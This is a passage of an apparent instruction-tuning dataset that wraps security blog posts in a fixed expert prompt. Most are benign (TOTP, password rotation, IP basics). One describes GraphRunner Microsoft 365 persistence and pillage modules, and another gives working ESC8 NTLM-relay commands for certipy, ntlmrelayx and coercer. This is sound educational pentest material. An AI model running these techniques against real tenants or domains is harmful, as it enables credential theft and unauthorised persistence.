graph.windows.net to pull the policies A module detailed later in this blog post around injecting app registrations Invoke-InjectOAuthApp spurred the creation of the Invoke-DumpApps module This module can assist in identifying malicious app registrations It will dump a list of Azure app registrations from the tenant including permission scopes and users that have consented to the apps Additionally it will list external apps that are not owned by the current tenant or by Microsoft's main app tenant This is a way to find third-party external apps that users may have consented to The Get-AzureADUsers and Get-SecurityGroups modules can be used to dump users and groups from the tenant Group-based attacks are one of the more interesting areas to highlight when it comes to GraphRunner's capabilities Our first use-case for attacking M365 groups involves changing group membership of certain groups even as a non-administrative user For example GraphRunner has modules that help in exploiting the fact that the default behavior for Microsoft 365 groups is that anyone in the organization can join them Whenever a team is created so is a Microsoft 365 group With that comes the automatic creation of a SharePoint site a mailbox Teams channel and more earn.microsoft.com en-us azure active-directory enterprise-users groups-self-service-management As detailed in Microsoft's documentation screenshot below the default behavior for Microsoft 365 groups makes them open for all to join Also note that in some scenarios security groups can be configured to be joinable as well earn.microsoft.com en-us microsoftteams office-365-groups This is where the Get-UpdatableGroups module comes in This module also leverages the Estimate Access API to determine if your current user has the ability to update groups in the tenant It will gather all groups from the tenant and check them one by one to determine if they are modifiable If you find modifiable groups that means that your current user has the ability to add members to that group including yourself other tenant members and even guests This can lead to privilege escalation scenarios as we demonstrate in the attack paths section later in the post On a similar topic dynamic groups are another interesting attack path in Microsoft 365 Dynamic groups are groups that are created with dynamic group membership rules When created dynamic groups are configured with a set of rules that automatically process objects into groups with certain attributes These groups can include various parameters such as the user's email location job title device and more They can help to automatically add users to groups but when misconfigured can be abused by attackers In the example above this dynamic group is configured to add any users whose user principal name contains the word admin This scenario can be exploited by simply inviting a guest user to the tenant with an email address that contains admin in it Upon being added as a guest to the tenant the account with admin in the name would automatically get added to the dynamic group GraphRunner helps in finding dynamic groups with the Get-DynamicGroups module After listing out dynamic groups in a tenant it would be necessary to analyze the membership rules to determine the potential for exploitability The Get-SharePointSiteURLs module goes hand-in-hand with the groups modules mentioned previously It uses the Graph Search API to try to locate all unique sites the user has access to It can be useful to run both prior to and after performing any group-based abuse to determine what new sites you have gained access to In 2017 I Beau wrote a post about abusing Exchange mailbox permissions Back then I wrote a module called Invoke-OpenInboxFinder for MailSniper that assisted in finding mailboxes that were configured so that other users in the organization could access them That module leveraged Exchange Web Services and Outlook Web Access It turns out that the same type of mailbox enumeration can be performed via the Microsoft Graph API GraphRunner has the Invoke-GraphOpenInboxFinder module to carry out this task In order for this to work you will need a token that is scoped to the Mail.Read.Shared permission or the Mail.ReadWrite.Shared permission This can be accomplished by consenting to an application with this scoped permission One quick and easy way to do this is to leverage the Graph Explorer It is a well-known application for testing out Graph API calls and you can consent to specific permissions here eveloper.microsoft.com en-us graph graph-explorer After consenting you can click the Access token tab to view your token and then set it to the tokens.access_token variable in your GraphRunner session Now running the Invoke-GraphOpenInboxFinder module against a userlist will attempt to access each inbox from the provided list If a user has set their inbox permissions too widely it's possible your current user may be able to read messages from their inbox Persistence When it comes to maintaining access GraphRunner has a few modules that can help to establish various levels of persistence in a tenant Deploying an application to a tenant is interesting in multiple scenarios By default users can create applications But by default they cannot add administrative privileges such as Directory.ReadWrite.All They can however add a number of delegated privileges that do not require admin consent by default Most of these privileges that do not require admin consent are for performing common tasks such as reading email Mail.Read listing users in the directory User.ReadBasic.All navigating SharePoint and OneDrive Files.ReadWrite.All and Sites.ReadWrite.All and many more By deploying an app with these permissions and then consenting to it as a user we have compromised we can then leverage the service principal credentials tied to the application to access the user's account If the compromised user changes their password the app still retains access to their account If all sessions are killed for the compromised user we still have access until the access token expires default is 1 hour to operate as the user The Invoke-InjectOAuthApp module is a tool for automating the deployment of an app registration to a Microsoft tenant In the event that the Azure portal is locked down this may provide an additional mechanism for app deployment provided that users are allowed to register apps in the tenant This module has a few hardcoded scope settings for quick deployment of certain types of apps but custom values can be entered as well For example when setting the -scope parameter to op backdoor the tool will create an app and add a large number of common permissions to it including access to Mail Files Teams and more None of these permissions require admin consent After the app is deployed the consent URL is automatically generated and displayed in the terminal in green above This URL is custom and tied to the specific app registration including all of the requested scope items When a user visits this URL they will be asked to consent to the permissions set for the app A few years ago this was leveraged heavily by attackers carrying out illicit consent grant phishing attacks Microsoft made some changes that effectively limited what an external unverified app could request access to for users not in the same tenant When an app is deployed in the same tenant as the victim being phished this is not the case Later in the attack paths section an internal app-based phishing scenario is laid out But in terms of persistence we would be visiting this link as our compromised user and consenting to it ourselves When an application with delegated permissions is consented to we need to catch the OAuth code that is sent to the specified redirect URI in order to complete the flow and obtain access tokens GraphRunner has multiple ways built-in to catch and complete the OAuth flow once consent has been granted In situations where the user is remote you would most likely want to stand up a web server and use something like the basic PHP redirector included in the GraphRunner repo to capture the code and complete the flow If we are creating persistence within an account we control it's possible to complete this flow by directing the browser to localhost The Invoke-AutoOAuthFlow module stands up a minimal web server to listen for this request and completes the OAuth flow with the provided app registration credentials When a localhost URL such as ocalhost 8000 is set as the ReplyURL with Invoke-InjectOAuthApp it will automatically detect it and ouput the exact command needed to run in another terminal to catch and complete the flow Prior to navigating to the consent URL and clicking consent run the command that was output in another terminal It will listen for requests to it containing the OAuth code and automatically complete the flow using the service principal's credentials Upon successfully completing the flow it will output a new set of access tokens as well as write them to the global apptokens variable in the terminal Now when you run GraphRunner modules you can specify the app tokens -Tokens apptokens and it will run in the context of the application leveraging the delegated permissions consented to in the user account Another potentially interesting attack vector via groups would be to create groups in an attempt to exploit watering hole-style attacks In this scenario an attacker would create a group to resemble another group that already exists but include their own user within it When applying permissions to a group via the Azure Portal the Microsoft Admin portal SharePoint sites and other locations it's not always clear exactly what group a policy is being applied to For example when applying a role to a resource in the Azure Portal such as when a user is granted permissions to read contribute or own a resource only the name of the group or user is displayed No other identifiable information about the group is provided here GraphRunner has a module called Invoke-SecurityGroupCloner that automates the ability to clone a group while adding your user or another of your choosing Running this module will list out all the groups in the tenant along with their members The Invoke-SecurityGroupCloner module will then ask what group you want to clone if you want to add your current user to the group if you want to add a different user and if you want to name it something else Upon cloning a group it will create an identically named group adding the current members of that group while including your own user Now when someone goes to add the Administrators group to a role they will be presented with two options Which one will they select Maybe both GraphRunner also includes modules for inviting guest users Invoke-InviteGuest as well as adding members to groups Invoke-AddGroupMember In order to use the Invoke-AddGroupMember module you will need both the group ID and the member ID of the user you want to add to the group The group ID is output with each group via the Get-SecurityGroups module and the Get-UpdatableGroups module The user ID for your current user can be found by running Invoke-CheckAccess or using the Get-UserObjectID module Pillage GraphRunner includes a number of pillage modules that assist in identifying interesting data post-compromise of a Microsoft 365 account It contains modules for searching through and collecting data from email SharePoint OneDrive and Teams The Invoke-SearchMailbox module allows for the searching of terms through the current user's mailbox It allows for downloading messages including their attachments and even has a minimal HTML email viewer included for opening the downloaded messages in a web browser The Invoke-SearchMailbox module uses the Graph Search API so it doesn't allow for searching of other user's mailbox Also due to the use of the Search API only items that match the search term will be returned If you want to get the latest messages from an inbox of either the current user or a shared mailbox then the Get-Inbox module is the one you will want to use This module will pull the latest 25 messages from an inbox by default more can be specified with the -TotalMessages parameter Microsoft Teams has become the primary chat app for many organizations Occasionally sensitive data tends to get sent through this medium It may be of benefit to search through Teams chat messages the user is a part of The Invoke-SearchTeams module provides search capabilities for messages sent via Teams Chat Direct Messages Similarly the Get-TeamsChat module downloads full Teams chat conversations It will prompt to either download all conversations for a particular user or to download individual conversations using a chat ID This module requires that you have a token scoped to Chat.ReadBasic Chat.Read or Chat.ReadWrite Occasionally sensitive data ends up in attributes tied to user accounts Maybe the help desk set a password for an account and didn't want to forget it so they set the password as a comment in an attribute We have seen similar cases to this on many pentests and it can lead to gaining access to other accounts not previously accessible GraphRunner has a module to search through every attribute field for every Entra ID user called Invoke-SearchUserAttributes Using this module you can pass it a search term to look for in Entra ID user attributes SharePoint is one of the largest services for file sharing and collaboration Many organizations are using it in a similar manner to the way that internal network file shares are used to store files some of them including sensitive data such as credentials Historically we have used tools such as ShareFinder and FileFinder from PowerView or Snaffler to help us look for interesting files on internal networks There is SnaffPoint for searching SharePoint sites but it doesn't appear to use the Graph API The advantage of using the Graph Search API for searching for files is that it will automatically search all SharePoint sites AND OneDrive locations accessible to your user without needing to specify a certain site The Graph Search API uses Keyword Query Language KQL which lets users filter searches with terms like filetype filename and author For example if you wanted to find all Word document files that contain the term password in them you can search for filetype docx password GraphRunner has a module called Invoke-SearchSharePointAndOneDrive that leverages this search functionality and allows you to also download any files that were discovered If you want to simulate a similar type of assessment that Snaffler and Snaffpoint do you can leverage the provided default_detectors.json file in the GraphRunner repo This file contains much"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Opt for TOTP to Deal With MFA App Sprawl</title>\n<taxonomies>General InfoSec Tips & Tricks, Informational, Sean Verity</taxonomies>\n<creation_date>Thu, 26 Oct 2023 16:00:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Sean Verity Do you have a bunch of MFA apps on your phone that leave you feeling like you can't put your arms down Or maybe all those MFA apps on your phone feel like a litter of English bulldog puppies They follow you around demand your attention and give you security snuggles Either way that's a lot of figurative winter gear to take care of a lot of mouths to feed With all those apps to keep track of consider the following What will you lose access to if you break or lose your phone Do all your MFA apps let you do backup export For the apps that you know do backups did you do a backup within the past month or so What's the process look like for restoring those MFA apps on a new phone Have you tested this process to make sure there aren't any surprises How about migrating to a different MFA app Assuming you can export your data how hard is it going to be to convert that data into a format that your next MFA app can parse I'll be the first to admit that I've been socially engineered by service providers to install their MFA apps on more than one occasion Think about one of those times where you registered MFA with a new service provider The procedure usually starts with the service provider saying something like Your organization is requiring you to do MFA Start by installing our MFA app What if I already have three MFA apps on my phone Are none of them good enough If you're lucky the service provider will at least suggest a couple alternative MFA apps that could work Even after registration though there's a pretty good chance that you'll be gently nudged to install the service provider's app every time you log in with phrases like Can't access our MFA app right now Talk about presumptuous While each MFA app has its own special way of doing MFA that's way more secure than every other vendor there is a standards-based approach to MFA you're probably familiar with that just about every MFA app supports It's the MFA flavor where you have 30 seconds to enter a 6-digit code and it goes by a couple of names Google Authenticator Time-based One Time Password TOTP I used to think that you MUST install the Google Authenticator app when I saw Google Authenticator listed as a supported MFA app However I've now come to interpret Google Authenticator as an app that supports TOTP From the Google Authenticator Github Wiki The nice thing about service providers that support TOTP is that there are a LOT of apps that support TOTP because it is standardized1 and pretty simple Here's an overview of how TOTP authentication usually2 works The user and the service provider have a shared secret The user's TOTP app counts the number of time steps since the Unix epoch The number of time steps is combined with the shared secret to calculate a 6-digit code with HMAC-SHA-1 The user presents the 6-digit code to the service provider during authentication Upon receipt of the 6-digit code the service provider does the same calculation using its copy of the shared secret If the codes match the authentication is successful Easy peasy hey As a matter of fact TOTP is so simple that you could implement it in 20 lines of python or almost entirely in bash if you're not into the whole graphical user interface thing So this means that you have more flexibility with what MFA apps to use and how many to install when you opt for TOTP For example You could choose to use a commercially supported closed-source app or an open-source app that you can audit You could do offline local backups of MFA keys or use a solution that offers an online backup feature that you trust You can find a TOTP app that lets you register multiple devices If you're into retro computing you could turn that old Commodore 64 into a stand-alone TOTP generator How to Tell if a Service Provider Supports TOTP When it comes to identifying if a service provider supports TOTP you probably will not get a clear declaration Here are a few hints that you're more likely to see during MFA registration The service provider will state something along the lines of Enter a code from your MFA app This is an acknowledgement that you may already have an MFA app Since TOTP is the most common flavor of MFA there's a good chance that TOTP is supported Look for an option that says Google Authenticator Oftentimes a Google Authenticator logo will be next to it If neither of those other hints are showing up then TOTP might be buried as a fallback option That is you might need to reject the initial offerings from the service provider This is sometimes indicated by Try another method How to Shop for TOTP Apps Obviously the primary consideration is whether the app supports TOTP As with MFA registration app descriptions in the App Store or Google Play generally don't come out and say This app supports TOTP Most MFA apps do support TOTP but to verify search for something like does XYZ MFA app support TOTP This should yield a technical support page blog or best of all source code Here's a few more questions to consider which might take a little legwork to figure out as you start to narrow down your choices MFA Code BackupsIs cloud backup OK or do you need local backups If cloud backups are OK do your backups need End-to-End Encryption E2EE Not all MFA apps offer E2EE backups See the following ww.bleepingcomputer.com news google google-will-add-end-to-end-encryption-to-google-authenticator Number of Device Registrations Can you get away with having only one device registered with a service provider If you want to have a backup device at the ready keep an eye out for features that let you transfer or export MFA codes to a second device Do you have a de-Googled Android phone and want to keep it that way Google services are typically necessary to install or launch an MFA app when the app supports push notifications even if a service provider doesn't use push notifications for MFA Independent Security Audits Look for independent security audits of an MFA app you're considering Here's a detailed USENIX 2023 paper to get you started ww.usenix.org system files sec23summer_198-gilsenan-prepub.pdf What's really cool about this paper is that the researchers provide steps to reproduce their findings ithub.com blues-lab totp-app-analysis-public Will there be cases where your chosen MFA app doesn't work for a specific scenario But hopefully you've seen how opting for TOTP provides you some flexibility in how you do MFA At the very least you won't have as many MFA apps to keep track of if you opt for TOTP authentication Footnotes 1 atatracker.ietf.org doc html rfc6238 2 SHA-1 is the suggested default and by far the most common implementation The RFC mentions SHA-256 or SHA-512 variants though TOTP time steps don't have to be 30 seconds either You could go crazy and generate TOTPs every 5 seconds if you wanted to"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Rotating Your Passwords After a Password Manager Breach</title>\n<taxonomies>Ethan Robish, General InfoSec Tips & Tricks, How-To, Informational, InfoSec 101, Personal Security</taxonomies>\n<creation_date>Thu, 02 Nov 2023 16:13:04 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Ethan Robish It's been nearly a year since Lastpass was breached and users encrypted vaults were stolen I had already migrated to a different password manager for all my existing and new accounts but I had been putting off rotating passwords for existing accounts I was like the child who plugs his ears while chanting La la la I can't hear you I have a long master password while his parents try to provide wisdom I know I'm not alone in this either Recently there's even been evidence that attackers have cracked users vaults and begun stealing cryptocurrency from the victims This was the final push I needed to unplug my ears and take action If you're anything like me you have hundreds of accounts accumulated over time Whenever I looked at the pile of accounts and secrets in my stolen vault I became discouraged by the seemingly insurmountable task of logging into each site and changing the password What I realized was that it wasn't all or nothing not all these dusty old accounts were of the same value to me or an attacker I decided to make a prioritized list for me to work through This turned out to be a much more fruitful exercise than just hoping the problem would go away I decided I would share my thought process and my prioritization list for anyone else who might find it useful Hopefully this post can be a gentle nudge to shore up your own personal security General Considerations This applies even if you haven't migrated from LastPass to another password manager If you have a significant other help them through this process as well Not only because you care for them but because a breach of their accounts could affect you as well I have extreme dislike for security questions also known as account recovery questions I tend to pick nonsense answers that are untrue but still plausible in case I ever have to use them with a real person I store these questions and answers in my password manager This means that I need to change these answers as well Since I was logging into accounts anyway I took the opportunity to evaluate any new 2FA capabilities and upgrade to a stronger mechanism where possible none SMS TOTP Security Key Some accounts are even starting to support Passkeys Prioritize accounts with no existing 2FA enabled But remember that your account is only as strong as its weakest link Prioritization Steps Export a backup from your current password manager You never know when this can come in handy Store this in a secure place Change email account passwords Email is often used to recover passwords Change cell provider password Set a port out PIN if your carrier supports it This will reduce the risk of a SIM swapping attack Change all financial account passwords Prioritize from most money to least Investments banking credit cards Cryptocurrency If your seed phrase or wallet key was exposed transfer your coin to a new wallet Rotate any private keys that were exposed e.g SSH GPG TLS Prioritize ones without encryption or where the encryption password was also stored This is probably the biggest headache of all because it involves revoking key signatures and removing SSH keys from all systems where it was added Other important accounts Think of places where it would be detrimental for someone to impersonate you Identity providers Places you see listed on the sign in using another account pages e.g Apple Github Facebook Google Microsoft Cloud infrastructure e.g Digital Ocean AWS Azure DNS Registrars e.g Cloudflare GoDaddy Namesilo Code repos e.g Github Gitlab File backups e.g Dropbox Backblaze Remote management e.g Teamviewer Shopping e.g Amazon Social media Finally delete your LastPass account if you have migrated elsewhere Of course this won't help protect anything already stolen but it will help reduce your risk in the future by reducing your attack surface to only what you are actually using whatever your current password manager is Ultimately you get to decide how far down this list you want to go"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Abusing Active Directory Certificate Services (Part 3)</title>\n<taxonomies>Alyssa Snow, Blue Team, External/Internal, General InfoSec Tips & Tricks, How-To, Informational, InfoSec 101, Red Team, Active Directory, ADCS, exploit</taxonomies>\n<creation_date>Thu, 09 Nov 2023 17:06:33 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Alyssa Snow In PART ONE and PART TWO of this blog series we discussed common misconfigurations of Active Directory certificate templates In this post we will walk through exploitation of the Web Enrollment feature Active Directory Certificate Services ADCS supports HTTP-based enrollment methods If enabled HTTP-based certificate enrollment interfaces can be vulnerable to NTLM relay attacks If an attacker can coerce a victim account to authenticate to the attacker-controlled machine the credential material can be relayed to the Certificate Authority to request a certificate on behalf of the victim In some cases a relay attack may not even require domain credentials For example if the victim host is not patched against CVE-2021-369421 an attacker on the network could trick the victim machine to authenticate to the attacker host by abusing the vulnerable API method OpenEncryptedFileRaw through LSARPC Local System Authority Remote Protocol interface This blog post will not discuss relay attacks in detail however BHIS has many resources for red and blue teams alike on relay attacks which can be found in the Resources section towards the end of this article ESC8 In the following example let's imagine that we have gained a foothold in our target company FOOBAR's internal network and have compromised the account of a user with the name billy We want to enumerate the ADCS configuration for the internal target domain foobar.com To enumerate ADCS configurations with Certipy2 use the find command and use the -enabled flag to specifically print out templates that are enabled The full Certipy command is shown below certipy find -u 'billy foobar.com -p -dc-ip -enabled Certipy outputs the enumeration results of interest in JSON JavaScript Object Notation and TXT files following the naming convention _Certipy as shown in the figure below ADCS Enumeration Note that the ESC8 technique does not abuse certificate template misconfigurations Instead this technique leverages the configuration of the Certificate Authority CA server Active Directory Certificate Authorities that are vulnerable to ESC8 meet the following conditions Web Enrollment Enabled Request Disposition Issue Vulnerable Certificate Authority As shown in the figure above foobar-CA is vulnerable to ESC8 which means if we can coerce a domain account to authenticate to our machine we can relay the victim's credential material to the CA to obtain a certificate on behalf of that victim The template specified in the relay attack must be a template that the victim account has permission to enroll in For instance a common NTLM relay technique involves tricking a machine account to authenticate to the attacker-controlled host via abuse of Microsoft's Encrypting File System Remote Protocol MS-EFSRPC In this example we will coerce server01.foobar.com to authenticate to our machine 10.10.1.100 and request a certificate using the following enabled template Domain Computers Template The attack path can be summarized as follows Coerce the victim machine server01.foobar.com to authenticate to an attacker-controlled host Relay the hash obtained from the victim to the ADCS HTTP endpoint http certsrv certfnsh.asp Request a certificate in the name of the coerced machine account Authenticate with the obtained certificate to collect the NTLM hash of the victim machine Step 1 Set Up Relay We can configure Certipy to relay the coerced credentials to the ADCS HTTP endpoint oobar-CA.foobar.com certsrv certfnsh.asp to request a certificate on behalf of server01.foobar.com using the following command certipy relay -ca foobar-CA.foobar.com -template 'DomainComputers If you do not specify a template name Certipy will attempt to issue a certificate using the Machine and User templates These are default templates but that does not mean that they will be available in your target environment or that they apply to your victim account Side Note You could also use Impacket3 to relay the credential material to the target HTTP endpoint The Impacket command for this is shown below python3 ntlmrelayx.py -t 'oobar-CA.foobar.com certsrv certfnsh.asp --adcs --template 'DomainComputers If you do not specify a template name Ntlmrelayx will attempt to issue a certificate using the DomainController template This is a default template but it may not be available in your target environment Step 2 Coerce Victim Machine Request a Certificate for Victim There are several tools that can be used to conduct coercion attacks Coercer ithub.com p0dalirius Coercer ithub.com bats3c ADCSPwn PetitPotam ithub.com topotam PetitPotam In this example we will use Coercer a Python tool that can be used to coerce Windows machines to authenticate to your machine by calling known vulnerable RPC Remote Procedure Call functions coercer coerce -t server01.foobar.com -I 10.10.1.100 -u 'billy foobar.com -p -d foobar.com Coerce Victim Machine The error outlined in the figure above ERROR_BAD_NETPATH is what I like to call the good error This result indicates that the coercion was successful As shown in the figure above Coercer tried to force server01 to authenticate using multiple methods RPC methods The tool successfully forced the victim to authenticate using the EfsRpcDecryptFileSrv method As shown in the figure below the credential material was relayed through the Certipy relay that we set up earlier to the target endpoint oobar-CA.foobar.com certsrv certfnsh.asp and a certificate was obtained for server01 Certipy Relay Server Troubleshooting Sidebar If you find yourself in a situation where Certipy returns a certificate but the object does not have identification and you cannot authenticate using the resulting PFX like the example below Certificate Obtained Without Identification Failed to Authenticate with Certificate You may need to use the -upn flag and specify the victim's name For example certipy relay -ca 'foobar-CA -template 'DomainController -target 'FOOBAR-CA.foobar.com -upn 'DC01 foobar.com Get Certificate for DC01 End Sidebar Step 3 Impersonate Victim User Once we've successfully Coerced the target machine server01 and relayed the credentials to obtain a certificate on behalf of server01.foobar.com we can use the certificate to obtain the credential hash and a Kerberos ticket of the target server01 account using the Certipy auth command as shown below certipy auth -pfx server01.pfx We have successfully retrieved the hash for the server01 account and can impersonate server01 Get Server01 Credentials In summary Certificate Authorities with web enrollment enabled are susceptible to NTLM relay attacks In some cases relay attacks can be performed without domain credentials This issue could allow a user to escalate privileges in the target environment Additional Things to Consider Try to coerce the domain controller DC I've had a lot of luck with this in the past If you can coerce the domain controller you can impersonate the DC and gain DCSync access to the target domain When you obtain a certificate Certipy will return the request ID or an Object SID Take note of these values You can use that information to revoke the certificate A certificate is valid until the validity period ends unless the certificate is explicitly revoked The validity period is determined by the template configuration Using the example above this means that we will have access to server01.foobar.com's account for the next five years regardless of any password changes Prevention So what can we do to prevent such attacks Here are a few steps you can take Disable ADCS HTTP endpoints if they are not necessary If possible disable NTLM Authentication Enforce HTTPS and enable Extended Protection for Authentication6 Enable requirements for SMB LDAP signing Enforce LDAP channel binding Resources BHIS Blogs ww.blackhillsinfosec.com admins-nightmare-combining-hivenightmare-serioussam-and-ad-cs-attack-paths-for-profit ww.blackhillsinfosec.com an-smb-relay-race-how-to-exploit-llmnr-and-smb-message-signing-for-fun-and-profit ww.blackhillsinfosec.com mitm6-strikes-again-the-dark-side-of-ipv6 ww.blackhillsinfosec.com impacket-offense-basics-with-an-azure-lab ww.blackhillsinfosec.com impacket-defense-basics-with-an-azure-lab ww.blackhillsinfosec.com a-pentesters-voyage-the-first-few-hours BHIS Webcasts ww.blackhillsinfosec.com event bhis-webcast-coercions-and-relays-the-first-cred-is-the-deepest-with-gabriel-prudhomme ww.blackhillsinfosec.com webcast-attack-tactics-5-zero-to-hero-attack Additional Resources 1 src.microsoft.com update-guide vulnerability CVE-2021-36942 2 ithub.com ly4k Certipy 3 ithub.com fortra impacket osts.specterops.io certified-pre-owned-d95910965cd2 pecterops.io wp-content uploads sites 3 2022 06 Certified_Pre-Owned.pdf upport.microsoft.com en-us topic kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429 ocial.technet.microsoft.com wiki contents articles 10942.ad-cs-security-guidance.aspx earn.microsoft.com en-us previous-versions windows it-pro windows-server-2012-r2-and-2012 dn786443 28v ws.11 29 ww.thehacker.recipes ad movement kerberos unpac-the-hash ww.securew2.com blog how-to-revoke-certificate-in-windows-ad-cs earn.microsoft.com en-us openspecs windows_protocols ms-efsr 08796ba8-01c8-4872-9221-1000ec2eff31 earn.microsoft.com en-us openspecs windows_protocols ms-rprn d42db7d5-f141-4466-8f47-0a4be14e2fc1 earn.microsoft.com en-us openspecs windows_protocols ms-dfsnm 95a506a8-cae6-4c42-b19d-9c1ed1223979 earn.microsoft.com en-us openspecs windows_protocols ms-fsrvp dae107ec-8198-4778-a950-faa7edad125b earn.microsoft.com en-us openspecs windows_protocols ms-even 55b13664-f739-4e4e-bd8d-04eeda59d09f READ PART ONE PART TWO"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Unpacking the Packet: Demystifying the Internet Protocol</title>\n<taxonomies>Informational, InfoSec 101, Serena DiPenti, internet protocol, IP, Networking</taxonomies>\n<creation_date>Thu, 16 Nov 2023 16:57:15 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "The internet is a product of a global group effort to build an interoperable network connecting billions of devices regardless of country region or manufacturer That effort yielded hundreds of protocols defining standards for how devices communicate The Internet Protocol IP is the most widely known but myths and conspiracies have plagued it since its inception The myths might be widespread but are easy to dispute Several organizations including IEEE IETF and ISO have published standards or Requests for Comments RFCs online These documents can be dense with technical jargon but are a goldmine of information The current Internet Protocol standard RFC 791 was published in 1981 This article intends to demystify the Internet Protocol If you're familiar with how physical mail delivery works then it will be easy to understand how traffic moves through a network For example say you need to relocate from New York to California Your belongings won't fit into one box so you must divide everything into multiple boxes and slap on a destination and return address before shipping them off The same concept works for data moving through a network When you send an email or stream the latest movie that data will be transmitted with the help of the Internet Protocol among many others However instead of household items you will send a datagram and the data is split up into packets instead of boxes The Internet Protocol has two main functions addressing and fragmentation The source and destination will have an IP address Two versions of the Internet Protocol are in use today IPv4 and IPv6 An IPv4 address is fixed length with four octets It looks like this 192.168.1.1 IPv4 addresses are in limited supply and currently there are more network-capable devices than IPv4 addresses available Network Address Translation NAT and IPv6 are two solutions to help deal with IPv4 address exhaustion There are a few variations of NAT one of the most common is Port Address Translation PAT Your internet service provider will give your home one IP address Still you most likely have more than one device that needs an internet connection gaming systems laptops cell phones smart TVs Alexa and so on Since it is impossible for each device to have its own unique IP address your home router will assign each one a private IP address and a port number Your router will then send all the traffic from every device onto the public internet using its single public address assigned by the ISP IPv6 was developed to replace IPv4 fully IPv4 has a total of 4.3 billion addresses and IPv6 has around 340 trillion For various reasons the rollout of IPv6 has been slow but adoption is increasing Google publishes statistics on IPv6 connectivity amongst its users Fragmentation is necessary when a datagram is too large to traverse the network Due to various packet size limitations the Internet Protocol must break up datagrams into an arbitrary number of pieces that can be reassembled later An IP packet contains two vital sections header and data The IP header contains instructions for transmitting and reassembling data The illustration below shows an IPv4 header Figure 1 RFC 791 Summary of each header component Version There are two IP versions used today IPv4 and IPv6 The illustration above shows the format of an IPv4 header Internet Header Length This field indicates where the header ends and the data begins Type of Service ToS While not widely used ToS gave administrators the ability to prioritize different traffic requesting a route that would offer low-latency high-throughput or highly reliable service This component has changed over the years in different RFCs Total Length Total length of the packet including headers and data Identification If the datagram has been fragmented into multiple IP packets each packet will contain the same 16-bit identification number to indicate they belong together Flags This field will indicate if and how the datagram should be fragmented Fragment Offset This field will identify the order of the fragmented data Time to Live Maximum time the packet is allowed to remain on the network This feature is necessary for preventing routing loops and congestion from packets that are unable to reach their destination Protocol The IP packet will be encapsulated by another transmission protocol this field will indicate which protocol to use Header Checksum Headers can change while en route e.g time to live and the checksum can indicate if there is an error Source Address IP address of the sender Destination Address IP address for the destination Options Special delivery instructions This field is disabled by default and not used often Padding Used to make sure the IP header has a length of 32 bits The Internet Assigned Numbers Authority IANA Almost everyone has an IP address but most are unfamiliar with how it's assigned There are several common misunderstandings about IP addresses and what they can do The internet is full of videos claiming an IP address can pinpoint someone's exact location Location was not mentioned in the previous breakdown of how the Internet Protocol works A packet does not contain location information or coordinates and an IP address is just a number that is almost randomly assigned to you The Internet Assigned Numbers Authority IANA is an organization dedicated to tracking and distributing the limited supply of IPv4 addresses IANA delegates blocks of IP addresses to Regional Internet Registries RIR who then allocate those blocks to different requesting organizations across their region such as Internet Service Providers ISPs Internet Service Providers then can allocate those IP addresses to their customers This is how your home and cell phone get assigned an address which allows you to send data across the Internet There are five main regions AFRINIC Africa Region APNIC Asia Pacific Region ARIN Canada United States and some Caribbean Islands LACNIC Latin America and some Caribbean Islands RIPE NCC Europe the Middle East and Central Asia So what's the deal with IP addresses and geolocating There are several geolocation companies with proprietary location databases These databases have different degrees of accuracy and conflicting data While writing this article WhatIsMyIPAddress shows my location as Washington while MaxMind says Texas There is no official and accurate database geolocation data is all compiled by third-party companies Geolocation data can be valuable for advertisers wanting to reach their intended audience if your local ice cream parlor wants to advertise online they want to reach people in their area Geolocation data does not give exact coordinates of the user but can be accurate up to zip code How is the information collected The primary source for location information is the RIRs Registries allow assignees to specify a country and geographical coordinate for their IP address blocks There is no requirement to provide this information or assure its accuracy User-submitted data Example a weather website might ask for your location to provide a location-based forecast That data can be sold to these geolocation companies Associating your GPS coordinates with your IP address Guessing location based off the internet service provider who assigned the IP address Location data can be unreliable for several reasons Users may be using a VPN or proxy to hide their real IP address IP address blocks can be transferred and sold Universities like MIT were assigned IP addresses when the idea of everyone owning a personal computer sounded like science fiction There was no concern for address exhaustion so address blocks were assigned liberally Some early internet pioneers sold unused addresses once they became a hot commodity For example MIT sold around 8 million IP addresses to Amazon But there are plenty of other reasons addresses might be transferred or sold off like a company going out of business Company mergers happen all the time Large ISPs buy up smaller ISPs which can create 